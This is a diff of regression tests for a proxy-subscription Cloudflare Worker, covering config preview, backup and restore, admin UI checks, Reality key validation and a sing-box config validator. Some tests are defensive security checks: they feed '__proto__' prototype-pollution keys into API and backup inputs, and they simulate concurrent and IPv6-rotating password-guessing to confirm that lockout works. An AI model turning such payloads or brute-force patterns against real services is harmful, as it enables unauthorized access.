+  KV['profiles'] = JSON.stringify([{ id: 'pv', name: '预览', token: 'p'.repeat(20), enabled: true, own: 'all', ups: 'all', regions: 'all', pols: 'all', policies: 'inherit', mode: 'whitelist' }])
+  let r = await call70('/api/preview?pf=pv&fmt=clash')
+  ok(r.body.ok && r.body.fmt === 'clash' && /^# 订阅由/.test(r.body.body), '预览返回 Clash 配置')
+  const sub = await (await T.handle(new Request('https://x/sub?token=' + 'p'.repeat(20), { headers: { 'User-Agent': 'clash-verge/v2' } }), { waitUntil () {} })).text()
+  ok(sub === r.body.body, '预览内容与客户端拉到的完全一致')
+  r = await call70('/api/preview?pf=pv&fmt=sr')
+  ok(r.body.fmt === 'shadowrocket' && /\.conf$/.test(r.body.filename), 'Shadowrocket 预览，文件名带 .conf')
+  r = await call70('/api/preview?pf=nope')
+  ok(r.status === 404, '不存在的订阅返回 404')
+  // 自定义域名集被引用时不能删
+  KV['lib'] = JSON.stringify({ c70: { name: '测试集', hint: '', domains: ['a70.example'] } })
+  KV['policies'] = JSON.stringify([{ id: 'x', name: '引用者', target: 'all', presets: ['c70'], domains: [], keywords: [], processes: [] }])
+  r = await call70('/api/lib', { key: 'c70', act: 'del' })
+  ok(r.status === 400 && /引用者/.test(r.body.msg), '被策略引用的自定义集合不能删，并点名是谁在引用')
+  r = await call70('/api/lib', { key: '__proto__', name: 'x', domains: ['a.com'] })
+  ok(r.status === 400, '集合 key 只接受字母数字')
+  const pol = await call70('/api/policies')
+  ok(Array.isArray(pol.body.builtin) && pol.body.custom.includes('c70') && (pol.body.refs.c70 || []).includes('引用者'), '策略接口带回内置/自定义/引用信息')
+  restore()
+}
+
+sec('77. 备份与恢复')
+{
+  const keys = [...T.BACKUP_KEYS, 'snap:bk1', 'cache:nodes']
+  const restore = keep70(keys)
+  // 没保存过订阅时，默认订阅的 token 来自 SETUP_TOKEN；测试里没有它，先放一份正常订阅
+  KV['profiles'] = JSON.stringify([{ id: 'bkp', name: '备份', token: 'b'.repeat(24), enabled: true, own: 'all', ups: 'all', regions: 'all', pols: 'all', policies: 'inherit' }])
+  KV['upstreams'] = JSON.stringify([{ id: 'bk1', name: '备份测试', url: '', enabled: true, auto: false }])
+  KV['snap:bk1'] = JSON.stringify({ at: 1, nodes: [{ raw: 'n1' }] })
+  KV['settings'] = JSON.stringify({ domain: 'bk.example.com', directDomains: [], directIPs: [], proxyDomains: [] })
+  delete KV['chains']
+  let r = await call70('/api/backup')
+  const bk = r.body.backup
+  ok(bk && bk.app === 'cf-sub-worker' && bk.version === 1 && bk.data.settings.domain === 'bk.example.com', '导出包含配置')
+  ok(bk.snaps && bk.snaps.bk1 && bk.snaps.bk1.nodes.length === 1, '导出带上订阅源快照')
+  ok(!JSON.stringify(bk).includes('auth:'), '备份里没有登录凭据')
+  // 改乱之后恢复
+  KV['settings'] = JSON.stringify({ domain: 'changed.example.com' })
+  KV['chains'] = JSON.stringify([{ id: 'zz' }])
+  KV['cache:nodes'] = JSON.stringify({ at: 1, nodes: [] })
+  r = await call70('/api/restore', { backup: bk })
+  ok(r.body.ok, '恢复成功')
+  ok(JSON.parse(KV['settings']).domain === 'bk.example.com', '配置回到备份时的样子')
+  ok(KV['chains'] === undefined, '备份里没有的项被删掉（当时用的是默认值）')
+  ok(KV['cache:nodes'] === undefined, '恢复后作废节点缓存')
+  r = await call70('/api/restore', { backup: { app: 'other', data: {} } })
+  ok(r.status === 400, '别的程序的文件被拒')
+  r = await call70('/api/restore', { backup: { app: 'cf-sub-worker', version: 1, data: { profiles: 'x' } } })
+  ok(r.status === 400 && /格式不对/.test(r.body.msg), '格式不对的项被拒')
+  r = await call70('/api/restore', { backup: { app: 'cf-sub-worker', version: 1, data: { profiles: [{ token: 'short', enabled: true }] } } })
+  ok(r.status === 400 && /掉线/.test(r.body.msg), '没有可用订阅的备份被拒')
+  r = await call70('/api/restore', { backup: { app: 'cf-sub-worker', version: 1, data: {} } })
+  ok(r.status === 400 && /掉线/.test(r.body.msg), '完全不含订阅的备份被拒（否则会删掉现有订阅）')
+  r = await call70('/api/restore', { backup: JSON.parse('{"app":"cf-sub-worker","version":1,"data":{"__proto__":{},"profiles":[]}}') })
+  ok(r.status === 400 && /不认识/.test(r.body.msg || ''), '键名是 __proto__ 的备份返回 400 而不是抛异常')
+  // 从没保存过订阅时，导出的是实际生效的订阅（带着 token），换个账号恢复后地址照样能用
+  delete KV['profiles']
+  r = await call70('/api/backup')
+  ok(Array.isArray(r.body.backup.data.profiles) && r.body.backup.data.profiles.length === 1, '没保存过的默认订阅也会导出')
+  restore()
+}
+
+sec('78. 接口健壮性')
+{
+  const restore = keep70(['overrides', 'nodes', 'policies', 'profiles'])
+  let r = await call70('/api/node', { key: '__proto__', name: 'X', off: true })
+  ok(r.status === 400 && ({}).off === undefined && ({}).name === undefined, '__proto__ 当 key 被拒，原型链没被污染')
+  // 最后一个自有节点也能删（只用机场的人本来就不需要它）
+  KV['nodes'] = JSON.stringify({ only: { name: '唯一', type: 'hysteria2', s: 'h.example.com', p: 443, u: 'pw' } })
+  KV['policies'] = JSON.stringify([{ id: 'a', name: 'A', target: 'all', presets: ['youtube'] }])
+  KV['profiles'] = JSON.stringify([{ id: 'm', name: 'M', token: 'm'.repeat(20), enabled: true, own: 'all', ups: 'all', regions: 'all', pols: 'all', policies: 'inherit' }])
+  r = await call70('/api/own', { own: {} })
+  ok(r.body.ok, '能删掉最后一个自有节点')
+  // 恢复默认（清空）也得过悬空引用检查
+  KV['nodes'] = JSON.stringify({ only: { name: '唯一', type: 'hysteria2', s: 'h.example.com', p: 443, u: 'pw' } })
+  KV['policies'] = JSON.stringify([{ id: 'a', name: 'A', target: 'own:only', presets: ['youtube'] }])
+  r = await call70('/api/own', { act: 'reset' })
+  ok(r.status === 400 && /仍引用/.test(r.body.msg), '恢复默认同样检查策略引用，不再绕过')
+  r = await call70('/api/own', { own: { a: null } })
+  ok(r.status === 400, '节点数据不是对象时返回 400 而不是抛异常')
+  r = await call70('/api/own')
+  ok(r.body.links && /^hysteria2:\/\//.test(r.body.links.only || ''), '自有节点接口带回分享链接')
+  // 严格策略的自建目标被订阅排除时要能点名
+  const lost = T.strictLost({ own: [], pols: 'all', policies: 'inherit' }, [{ id: 'g', name: '🔍 G', strict: true, target: 'own:x' }, { id: 'y', name: 'Y', strict: false, target: 'own:x' }])
+  ok(lost.length === 1 && lost[0] === '🔍 G', '不含自建节点的订阅，严格策略被点名（非严格的不算）')
+  ok(T.strictLost({ own: 'all', pols: 'all', policies: 'inherit' }, [{ id: 'g', name: 'G', strict: true, target: 'own:x' }]).length === 0, '包含该节点时不报')
+  // 订阅编辑器的可选项：订阅勾过、眼下没节点的地区，以及停用的策略，都得列出来 ——
+  // 编辑器里没有这个选项，保存一次勾选就悄悄丢了
+  KV['profiles'] = JSON.stringify([{ id: 'm', name: 'M', token: 'm'.repeat(20), enabled: true, own: 'all', ups: 'all', regions: ['kz'], pols: ['off1'], policies: 'inherit' }])
+  KV['policies'] = JSON.stringify([{ id: 'off1', name: '停用的', enabled: false, target: 'all', presets: ['youtube'] }, { id: 'on1', name: '启用的', target: 'all', presets: ['media'] }])
+  r = await call70('/api/profiles')
+  const ro = r.body.opts.regions.find(x => x.v === 'kz')
+  ok(ro && /当前无节点/.test(ro.label), '勾过但没节点的地区仍可选，并标明当前无节点')
+  const po = r.body.opts.pols.find(x => x.v === 'off1')
+  ok(po && /已停用/.test(po.label), '停用的策略仍可选，并标明已停用')
+  restore()
+}
+
+sec('79. 管理端结构')
+{
+  const ui = T.adminHTML(true, true)
+  for (const [k, n] of [['node', '节点'], ['sub', '订阅'], ['pol', '分流策略'], ['lib', '域名库'], ['set', '设置']])
+    ok(ui.includes(`['${k}','${n}']`), `有「${n}」页`)
+  ok(/history\.replaceState\(null, '', '#' \+ t\)/.test(ui) && /addEventListener\('hashchange'/.test(ui), '当前页记在地址栏 #，刷新不丢')
+  // 主题要在首帧前定下来，放在 head 里单独一段脚本；它也得是合法 JS
+  const boot = (ui.match(/<script id="boot">([\s\S]*?)<\/script>/) || [])[1]
+  let err = ''
+  try { new Function(boot) } catch (e) { err = e.message }
+  ok(!!boot && !err, 'head 里的主题脚本存在且语法正确' + (err ? '：' + err : ''))
+  ok(/:root\[data-theme="dark"\]\{/.test(ui), '暗色主题由 data-theme 切换，可手动覆盖系统设置')
+  ok(/@media \(max-width:640px\)/.test(ui) && /@media \(hover:none\)\{\.nd \.act\{opacity:1/.test(ui), '窄屏布局与触屏常驻操作按钮')
+  ok(/function qrMatrix\(text\)/.test(ui) && /function qrSVG\(text, opts\)/.test(ui), '内置二维码生成')
+  ok(/shadowrocket:\/\/add\/sub:\/\//.test(ui) && /clash:\/\/install-config\?url=/.test(ui) && /sing-box:\/\/import-remote-profile\?url=/.test(ui), '三种客户端的一键导入')
+  ok(/window\.previewSub/.test(ui) && /window\.runMatch/.test(ui) && /window\.exportBackup/.test(ui) && /window\.importBackup/.test(ui), '预览、规则测试、备份恢复入口齐全')
+  ok(!/onclick="resetOwn\(\)"/.test(ui), '去掉了一键清空自有节点的按钮')
+  ok(/grip\.addEventListener\('pointerdown'/.test(ui), '触屏也能拖拽排序')
+  ok(/function maskUrl/.test(ui) && /esc\(maskUrl\(u\.url\)\)/.test(ui), '机场订阅地址展示时打码')
+}
+
+sec('80. 管理端的纯函数')
+{
+  // 从生成的前端脚本里把函数源码取出来单独执行：它们只用字符串运算，不碰 DOM
+  const ui = T.adminHTML(true, true)
+  const js = ui.slice(ui.indexOf('<script>'), ui.lastIndexOf('</script>'))
+  const grab = name => {
+    const i = js.indexOf('\nfunction ' + name + '(')
+    const j = js.indexOf('\n}\n', i)
+    return new Function(js.slice(i, j + 2) + '\nreturn ' + name)()
+  }
+  const maskUrl = grab('maskUrl'), clientName = grab('clientName'), flagOf = grab('flagOf')
+  const m1 = maskUrl('https://a.example.com/api/v1/client/subscribe?token=abcdef1234567890&flag=clash')
+  ok(m1 === 'https://a.example.com/api/v1/client/subscribe?token=abcd…890&flag=clash', '查询参数里的长 token 打码，短参数保留：' + m1)
+  const m2 = maskUrl('https://x.example/sub/AbCdEfGhIjKlMnOpQrStUv?x=1')
+  ok(m2 === 'https://x.example/sub/AbCd…tUv?x=1', '路径里像 token 的长段打码：' + m2)
+  ok(maskUrl('https://short.example/s?a=1') === 'https://short.example/s?a=1', '没有长 token 的地址原样显示')
+  ok(clientName('clash-verge/v2.0.4') === 'Clash Verge 2.0.4', '认出 Clash Verge 与版本')
+  ok(clientName('ClashMetaForAndroid/2.11.1.Meta') === 'Clash Meta 2.11.1', '认出 Clash Meta for Android')
+  ok(clientName('SFI/1.12.1 (Build 1; sing-box 1.12.1)') === 'sing-box 1.12.1', '认出 sing-box 官方客户端')
+  ok(/^Shadowrocket/.test(clientName('Shadowrocket/2070 CFNetwork/1498.700.2 Darwin/24.1.0')), '认出 Shadowrocket')
+  ok(clientName('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36') === '浏览器', '浏览器不带版本号')
+  ok(clientName('') === '未知客户端', '没有 UA 时给出说明')
+  ok(flagOf('jp') === '🇯🇵' && flagOf('US') === '🇺🇸', '国家码转国旗')
+  ok(flagOf('') === '' && flagOf('x') === '' && flagOf('USA') === '', '不合法的国家码不生成乱码')
+}
+
+sec('81. Reality 公钥格式')
+{
+  // mihomo 与 sing-box 都按 32 字节 base64url 解公钥；有一个节点不合格，mihomo 就拒绝整份配置
+  const good = 'A'.repeat(43)
+  ok(T.realityOk(good, '0123456789abcdef') && T.realityOk(good, '') && T.realityOk(good, 'ab'), '43 位 base64url 公钥 + 合法 short-id 通过')
+  ok(!T.realityOk('A'.repeat(42), '') && !T.realityOk('A'.repeat(44), '') && !T.realityOk('A'.repeat(42) + '=', ''), '长度不对的公钥被拒')
+  ok(!T.realityOk('A'.repeat(42) + '+', '') && !T.realityOk('A'.repeat(42) + '/', ''), '标准 base64 的 + / 被拒（要 URL 安全字符集）')
+  ok(!T.realityOk(good, 'abc') && !T.realityOk(good, '0123456789abcdef00') && !T.realityOk(good, 'zz'), '奇数位、超过 16 位、非十六进制的 short-id 被拒')
+  const feed = [
+    `  - { name: 日本-好, type: vless, server: a.example.invalid, port: 443, uuid: 11111111-2222-3333-4444-555555555555, tls: true, reality-opts: { public-key: ${good}, short-id: "ab" } }`,
+    `  - { name: 日本-坏, type: vless, server: b.example.invalid, port: 443, uuid: 11111111-2222-3333-4444-555555555555, tls: true, reality-opts: { public-key: SHORTKEY, short-id: "ab" } }`,
+    `  - { name: 日本-普通, type: trojan, server: c.example.invalid, port: 443, password: x }`
+  ].join('\n')
+  const got = T.splitFeed(feed).nodes.map(n => n._name)
+  ok(got.includes('日本-好') && got.includes('日本-普通') && !got.includes('日本-坏'), '解析时剔除公钥写坏的节点，其它节点照常：' + got.join('、'))
+  // 升级前存下的缓存与快照没经过新解析器，取出来用时也要过滤
+  const legacy = [{ up: 'u', upName: 'U', raw: '日本-坏', region: 'jp', kv: { type: 'vless', 'reality-opts': '{ public-key: SHORTKEY, short-id: ab }' } },
+                  { up: 'u', upName: 'U', raw: '日本-好', region: 'jp', kv: { type: 'vless', 'reality-opts': `{ public-key: ${good}, short-id: ab }` } }]
+  ok(T.applyNaming(legacy, {}).map(n => n.raw).join() === '日本-好', '缓存 / 快照里的旧节点在使用时同样被剔除')
+  const restore = keep70(['nodes', 'policies', 'profiles'])
+  // 默认策略指着 usV2 等自有节点，不先换掉的话保存会被悬空引用检查拦下
+  KV['policies'] = JSON.stringify([{ id: 'a', name: 'A', target: 'all', presets: ['youtube'] }])
+  KV['profiles'] = JSON.stringify([{ id: 'm', name: 'M', token: 'm'.repeat(20), enabled: true, own: 'all', ups: 'all', regions: 'all', pols: 'all', policies: 'inherit' }])
+  const base = { name: '坏公钥', type: 'vless', s: 'a.example.com', p: 443, u: '11111111-2222-3333-4444-555555555555', sni: 'www.example.com', net: 'tcp' }
+  let r = await call70('/api/own', { own: { bad: { ...base, pk: 'A'.repeat(42), sid: 'ab' } } })
+  ok(r.status === 400 && /43 位/.test(r.body.msg), '保存自有节点时拦下长度不对的公钥，并说明应是几位')
+  r = await call70('/api/own', { own: { bad: { ...base, pk: good, sid: 'abc' } } })
+  ok(r.status === 400 && /ShortId/.test(r.body.msg), '保存自有节点时拦下格式不对的 ShortId')
+  r = await call70('/api/own', { own: { ok1: { ...base, pk: good, sid: 'ab' } } })
+  ok(r.body.ok, '格式正确的自有节点正常保存')
+  restore()
+}
+
+sec('82. 第二轮审查的回归')
+{
+  // IPv6 按 /64 计数：同一段里换地址绕不过限速
+  ok(T.ipBucket('2001:db8:1:2:3:4:5:6') === '2001:db8:1:2::/64' && T.ipBucket('2001:0db8:0001:0002::9') === '2001:db8:1:2::/64', 'IPv6 取前 64 位')
+  ok(T.ipBucket('2001:db8::1') === '2001:db8:0:0::/64' && T.ipBucket('203.0.113.9') === '203.0.113.9', '压缩写法展开，IPv4 原样')
+  const restore = keep70(['auth:password', 'auth:secret', 'hits:c82'])
+  KV['auth:password'] = JSON.stringify(await T.hashPassword('right-pass-1'))
+  const tryLogin = (pw, ip) => T.adminRoute(new Request('https://x/admin/login', { method: 'POST', headers: { 'Content-Type': 'application/json', 'CF-Connecting-IP': ip }, body: JSON.stringify({ password: pw }) }), new URL('https://x/admin/login')).then(r => r.status)
+  // 并发：同一时刻 12 个错误密码，最多 5 个能进门去算哈希
+  const st = await Promise.all(Array.from({ length: 12 }, (_, i) => tryLogin('wrong-' + i, '198.51.100.82')))
+  ok(st.filter(x => x === 401).length <= 5 && st.filter(x => x === 429).length >= 7, `并发猜密码只放进 5 个（401×${st.filter(x => x === 401).length}，429×${st.filter(x => x === 429).length}）`)
+  // 同一 /64 里换地址也算同一个人
+  for (let i = 0; i < 5; i++) await tryLogin('bad', '2001:db8:82:1::' + (i + 1))
+  ok(await tryLogin('right-pass-1', '2001:db8:82:1::99') === 429, '同一 /64 段换地址绕不过锁定')
+  ok(await tryLogin('right-pass-1', '2001:db8:82:2::1') === 200, '别的 /64 段不受影响')
+  // 限速不写 KV：失败再多，KV 里也不多一个 key
+  const before = Object.keys(KV).length
+  for (let i = 0; i < 3; i++) await tryLogin('bad', '192.0.2.' + (80 + i))
+  ok(Object.keys(KV).length === before, '密码错误不产生任何 KV 写入')
+  // 改密码时猜旧密码同样计入限速
+  const exp = String(Date.now() + 3600e3)
+  const ck = 'sess=' + encodeURIComponent(exp + '.' + await T.hmac(await T.sessionSecret(), exp))
+  const chg = pw => T.apiRoute(new Request('https://x/api/password', { method: 'POST', headers: { 'Content-Type': 'application/json', Cookie: ck, 'CF-Connecting-IP': '198.51.100.83' }, body: JSON.stringify({ oldPassword: pw, newPassword: 'another-pass-2' }) }), new URL('https://x/api/password'), null).then(r => r.status)
+  for (let i = 0; i < 5; i++) await chg('guess-' + i)
+  ok(await chg('right-pass-1') === 429, '拿到 cookie 也不能无限次猜旧密码')
+  // 拉取记录：并发 80 个不同客户端，写入次数仍然守住每日上限
+  delete KV['hits:c82']
+  await Promise.all(Array.from({ length: 80 }, (_, i) => T.recordHit({ id: 'c82' }, new Request('https://x/sub', { headers: { 'User-Agent': 'client-' + i, 'CF-Connecting-IP': '203.0.113.' + (i % 250) } }), 'clash')))
+  const h = JSON.parse(KV['hits:c82'])
+  ok(h.writes === 60 && h.list.length === 12, `并发下每日上限照样生效（写了 ${h.writes} 次，保留 ${h.list.length} 条）`)
+  restore()
+
+  // 规则测试：关键词不分大小写（mihomo 会转小写），并说明规则来自哪里
+  const y = ['rules:', '  - DOMAIN-KEYWORD,GitHub,🧪 K', '  - DOMAIN-SUFFIX,github.com,⚙️ 开发者', '  - MATCH,🚀 节点选择'].join('\n')
+  ok(T.matchRules('\n' + y, 'api.github.com').target === '🧪 K', '关键词按不分大小写匹配')
+  const src = await T.ruleSource({ type: 'DOMAIN-SUFFIX', value: 'youtube.com', target: '📺 YouTube' }, { policies: 'inherit', pols: 'all' })
+  ok(src.kind === 'policy' && src.policy === '📺 YouTube' && (src.sets || []).includes('YouTube'), '说明命中的规则来自哪条策略、哪个域名集')
+  const r0 = await call70('/api/match', { q: 'http://' })
+  ok(r0.status === 400, '只有协议头、没有主机名的输入返回 400')
+
+  // VLESS + WebSocket + TLS 的分享链接导入成 ws 自有节点，而不是一个缺公钥的 tcp 节点
+  const ws = T.shareToOwn('vless://11111111-2222-3333-4444-555555555555@cdn.example.com:443?encryption=none&security=tls&sni=cdn.example.com&type=ws&host=h.example.com&path=%2Fvl#CDN')
+  ok(ws && ws.node.net === 'ws' && ws.node.path === '/vl' && ws.node.host === 'h.example.com' && !ws.node.warn, 'ws 链接导入为 WebSocket 自有节点，带路径与 Host')
+  const rt = T.shareToOwn('vless://11111111-2222-3333-4444-555555555555@r.example.com:443?security=reality&pbk=' + 'A'.repeat(43) + '&sid=ab&type=tcp&flow=xtls-rprx-vision#R')
+  ok(rt && rt.node.net === 'tcp' && rt.node.flow === 'xtls-rprx-vision' && rt.node.pk.length === 43, 'Reality 链接照旧导入为 tcp + Vision')
+  const ui = T.adminHTML(true, true)
+  ok(/\{v:'ws',label:'WebSocket \+ TLS（可套 CDN）'\}/.test(ui) && /id="opath"/.test(ui) && /id="ohost"/.test(ui), '自有节点表单可选 WebSocket，并有路径与 Host 输入框')
+}
+
 sec('55. 粘贴导入的订阅源可以只改名字')
 {
   // 这类源本来就没有链接，以前改个名字也被「链接和内容至少填一个」拦住
@@ -2170,6 +2604,715 @@ sec('55. 粘贴导入的订阅源可以只改名字')
   const r = await (await T.apiRoute(req, new URL('https://x/api/upstreams'), null)).json()
   ok(r.ok && r.up && r.up.name === '改过的名字' && r.up.url === '', '服务端接受只改名字，链接保持为空')
   if (saved === undefined) delete KV['upstreams']; else KV['upstreams'] = saved
+}
+
+// ====== 以下为配置生成审查（56 起）的回归测试 ======
+// sing-box 1.12 ~ 1.14 的结构校验：只查会让 sing-box 拒绝加载整份配置的问题。
+// 本机没有 sing-box 二进制，规则按官方源码核对（option/*.go、deprecated/constants.go）。
+function sbCheck(text) {
+  const errs = [], E = m => errs.push(m)
+  let c
+  try { c = JSON.parse(text) } catch (e) { return ['JSON 解析失败: ' + e.message] }
+  const walk = (o, path, fn) => {
+    if (Array.isArray(o)) o.forEach((x, i) => walk(x, `${path}[${i}]`, fn))
+    else if (o && typeof o === 'object') for (const [k, v] of Object.entries(o)) { fn(k, v, path); walk(v, `${path}.${k}`, fn) }
+  }
+  walk(c, '', (k, v, p) => { if (k === 'geoip' || k === 'geosite' || k === 'source_geoip') E(`${p}.${k}: geoip/geosite 在 1.12 已移除`) })
+  const outs = c.outbounds || [], tags = new Map()
+  for (const o of outs) { if (tags.has(o.tag)) E(`outbound tag 重复: ${o.tag}`); tags.set(o.tag, o) }
+  const OUT_TYPES = new Set(['direct', 'block', 'selector', 'urltest', 'vless', 'vmess', 'trojan', 'shadowsocks', 'hysteria2', 'anytls'])
+  const TR = new Set(['http', 'ws', 'quic', 'grpc', 'httpupgrade'])
+  const UTLS = new Set(['chrome', 'chrome_psk', 'chrome_psk_shuffle', 'chrome_padding_psk_shuffle', 'chrome_pq', 'chrome_pq_psk', 'firefox', 'edge', 'safari', '360', 'qq', 'ios', 'android', 'random', 'randomized'])
+  const SS = new Set(['aes-128-gcm', 'aes-192-gcm', 'aes-256-gcm', 'chacha20-ietf-poly1305', 'xchacha20-ietf-poly1305', '2022-blake3-aes-128-gcm', '2022-blake3-aes-256-gcm', '2022-blake3-chacha20-poly1305', 'aes-128-ctr', 'aes-192-ctr', 'aes-256-ctr', 'aes-128-cfb', 'aes-192-cfb', 'aes-256-cfb', 'rc4-md5', 'chacha20-ietf', 'xchacha20', 'none'])
+  const VM = new Set(['auto', 'none', 'zero', 'aes-128-cfb', 'aes-128-gcm', 'chacha20-poly1305'])
+  const emptyDirect = t => { const o = tags.get(t); return o && o.type === 'direct' && Object.keys(o).every(k => k === 'type' || k === 'tag') }
+  for (const o of outs) {
+    const w = `outbound ${o.tag}`
+    if (!OUT_TYPES.has(o.type)) E(`${w}: 不支持的 type ${o.type}`)
+    if (o.type === 'selector' || o.type === 'urltest') {
+      if (!(o.outbounds || []).length) E(`${w}: 分组没有成员`)
+      for (const x of o.outbounds || []) if (!tags.has(x)) E(`${w}: 成员 ${x} 不存在`)
+      continue
+    }
+    if (o.detour !== undefined && !tags.has(o.detour)) E(`${w}: detour ${o.detour} 不存在`)
+    if (o.detour !== undefined && emptyDirect(o.detour)) E(`${w}: detour 指向空的 direct`)
+    if (!['direct', 'block'].includes(o.type)) {
+      if (!o.server) E(`${w}: 缺 server`)
+      if (!(o.server_port > 0 && o.server_port < 65536)) E(`${w}: server_port 非法`)
+    }
+    if (o.transport && !TR.has(o.transport.type)) E(`${w}: transport.type ${o.transport.type} 不被支持`)
+    if (o.transport && o.transport.type === 'http' && o.transport.host !== undefined && !Array.isArray(o.transport.host)) E(`${w}: http transport 的 host 必须是数组`)
+    const tls = o.tls
+    if (tls && tls.utls && tls.utls.enabled && !UTLS.has(tls.utls.fingerprint)) E(`${w}: 未知 uTLS 指纹 ${tls.utls.fingerprint}`)
+    if (tls && tls.reality && tls.reality.enabled && !(tls.utls && tls.utls.enabled)) E(`${w}: reality 缺 utls`)
+    if (['hysteria2', 'anytls', 'trojan'].includes(o.type) && !(tls && tls.enabled)) E(`${w}: 必须开 TLS`)
+    if (o.type === 'vless' && o.flow && o.flow !== 'xtls-rprx-vision') E(`${w}: 不支持的 flow ${o.flow}`)
+    if (o.type === 'vmess' && !VM.has(o.security)) E(`${w}: 不支持的 security ${o.security}`)
+    if (o.type === 'hysteria2' && o.obfs && (o.obfs.type !== 'salamander' || !o.obfs.password)) E(`${w}: obfs 不完整或类型不支持`)
+    if (o.type === 'hysteria2') for (const p of o.server_ports || []) if (!/^\d+:\d+$/.test(p)) E(`${w}: server_ports 格式 ${p}`)
+    if (o.type === 'shadowsocks' && !SS.has(o.method)) E(`${w}: 不支持的 method ${o.method}`)
+    if (o.type === 'shadowsocks' && o.plugin && !['obfs-local', 'v2ray-plugin'].includes(o.plugin)) E(`${w}: 不支持的插件 ${o.plugin}`)
+  }
+  for (const i of c.inbounds || []) {
+    for (const k of ['sniff', 'sniff_override_destination', 'sniff_timeout', 'domain_strategy', 'inet4_address', 'inet6_address'])
+      if (k in i) E(`inbound ${i.tag}: 旧字段 ${k}（1.13 起报错）`)
+    if (i.type === 'tun' && !(i.address || []).length) E('tun 缺 address')
+  }
+  const dns = c.dns || {}
+  if ('fakeip' in dns) E('dns.fakeip 是旧格式（1.14 报错）')
+  if ('independent_cache' in dns) E('independent_cache 在 1.14 弃用')
+  const dtags = new Map((dns.servers || []).map(s => [s.tag, s]))
+  if (dtags.size !== (dns.servers || []).length) E('dns server tag 重复')
+  const DNS_TYPES = new Set(['udp', 'tcp', 'tls', 'https', 'quic', 'h3', 'local', 'fakeip'])
+  for (const s of dns.servers || []) {
+    const w = `dns server ${s.tag}`
+    if (!DNS_TYPES.has(s.type)) E(`${w}: 缺 type（旧格式）`)
+    for (const k of ['address', 'address_resolver', 'address_strategy', 'strategy']) if (k in s) E(`${w}: 旧字段 ${k}（1.14 报错）`)
+    if (['udp', 'tcp', 'tls', 'https', 'quic', 'h3'].includes(s.type)) {
+      if (!s.server || /\/\//.test(s.server)) E(`${w}: server 非法 ${s.server}`)
+      const isDomain = !/^\d{1,3}(\.\d{1,3}){3}$/.test(s.server) && !String(s.server).includes(':')
+      if (isDomain && !s.domain_resolver) E(`${w}: 域名 server 缺 domain_resolver`)
+    }
+    if (s.domain_resolver !== undefined && (!dtags.has(s.domain_resolver) || s.domain_resolver === s.tag)) E(`${w}: domain_resolver 非法`)
+    if (s.detour !== undefined && (!tags.has(s.detour) || emptyDirect(s.detour))) E(`${w}: detour ${s.detour} 非法（不存在或是空 direct）`)
+    if (s.type === 'fakeip' && !s.inet4_range) E(`${w}: 缺 inet4_range`)
+  }
+  for (const r of dns.rules || []) {
+    if ('outbound' in r) E('dns rule 含 outbound（1.14 报错）')
+    if (r.server && !dtags.has(r.server)) E(`dns rule server ${r.server} 不存在`)
+  }
+  if (dns.final && !dtags.has(dns.final)) E('dns.final 不存在')
+  const route = c.route || {}
+  const rs = new Set((route.rule_set || []).map(x => x.tag))
+  for (const x of route.rule_set || []) {
+    if (x.type === 'remote' && (!/^https:\/\//.test(x.url || '') || x.format !== 'binary')) E(`rule_set ${x.tag} 不完整`)
+    if (x.download_detour && !tags.has(x.download_detour)) E(`rule_set ${x.tag} download_detour 不存在`)
+  }
+  if ((route.rule_set || []).length && !(c.experimental && c.experimental.cache_file && c.experimental.cache_file.enabled)) E('远程规则集却没开 cache_file')
+  for (const r of route.rules || []) {
+    const act = r.action || 'route'
+    if (!['route', 'sniff', 'hijack-dns', 'reject', 'resolve', 'route-options', 'direct', 'bypass'].includes(act)) E(`route action ${act}`)
+    if (act === 'route' && !tags.has(r.outbound)) E(`route rule outbound ${r.outbound} 不存在`)
+    for (const t of [].concat(r.rule_set || [])) if (!rs.has(t)) E(`rule_set ${t} 未定义`)
+    if ((r.domain_suffix || []).some(d => !d || /[\s,*]/.test(d))) E('domain_suffix 里有非法项')
+  }
+  const rules = route.rules || []
+  if (!rules[0] || rules[0].action !== 'sniff' || !rules.some(r => r.action === 'hijack-dns')) E('最前面必须是 sniff，并且要有 hijack-dns')
+  if (route.final && !tags.has(route.final)) E('route.final 不存在')
+  const dr = route.default_domain_resolver
+  if (!dr || !dtags.has(typeof dr === 'string' ? dr : dr.server)) E('缺 route.default_domain_resolver（1.14 起报错）')
+  return errs
+}
+const sbOk = (label, text) => { const e = sbCheck(text); ok(e.length === 0, label + (e.length ? '：' + e.slice(0, 3).join(' | ') : '')); return e }
+// Clash 的悬空引用 / 重名检查（mihomo -t 的实测在 /tmp/gen-lab/cases.cjs）
+const clashRefs = d => {
+  const pn = d.proxies.map(p => p.name), gn = d['proxy-groups'].map(g => g.name)
+  const valid = new Set([...pn, ...gn, 'DIRECT', 'REJECT']), bad = []
+  if (new Set([...pn, ...gn]).size !== pn.length + gn.length) bad.push('名字重复')
+  d['proxy-groups'].forEach(g => { if (!(g.proxies || []).length) bad.push(`${g.name} 为空组`); (g.proxies || []).forEach(x => { if (!valid.has(x)) bad.push(`${g.name}→${x}`) }) })
+  d.rules.forEach(r => { const ps = r.split(','); const t = ps[ps.length - 1] === 'no-resolve' ? ps[ps.length - 2] : ps[ps.length - 1]; if (!valid.has(t)) bad.push('rule→' + r) })
+  d.proxies.forEach(p => { if (p['dialer-proxy'] && !valid.has(p['dialer-proxy'])) bad.push('dialer→' + p['dialer-proxy']) })
+  return bad
+}
+const UUID0 = '11111111-2222-3333-4444-555555555555'
+// mihomo / sing-box 都会校验 Reality 公钥格式（base64url 的 32 字节），测试里用格式合法的占位值
+const PKX = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+const B64 = s => Buffer.from(s, 'utf8').toString('base64')
+const feedOf = (lines, id = 'a', name = 'A') => T.feedParse(lines.join('\n'), null, { id, name }).nodes
+const namedOf = (nodes, ov) => T.applyNaming(nodes, ov || {}).filter(n => !n.off)
+const mkCookie = async () => { const exp = String(Date.now() + 3600e3); return 'sess=' + encodeURIComponent(exp + '.' + await T.hmac(await T.sessionSecret(), exp)) }
+const apiCall = async (path, body) => {
+  const req = new Request('https://x' + path, { method: 'POST', headers: { 'Content-Type': 'application/json', Cookie: await mkCookie() }, body: JSON.stringify(body) })
+  const r = await T.apiRoute(req, new URL('https://x' + path), null)
+  return { status: r.status, body: await r.json() }
+}
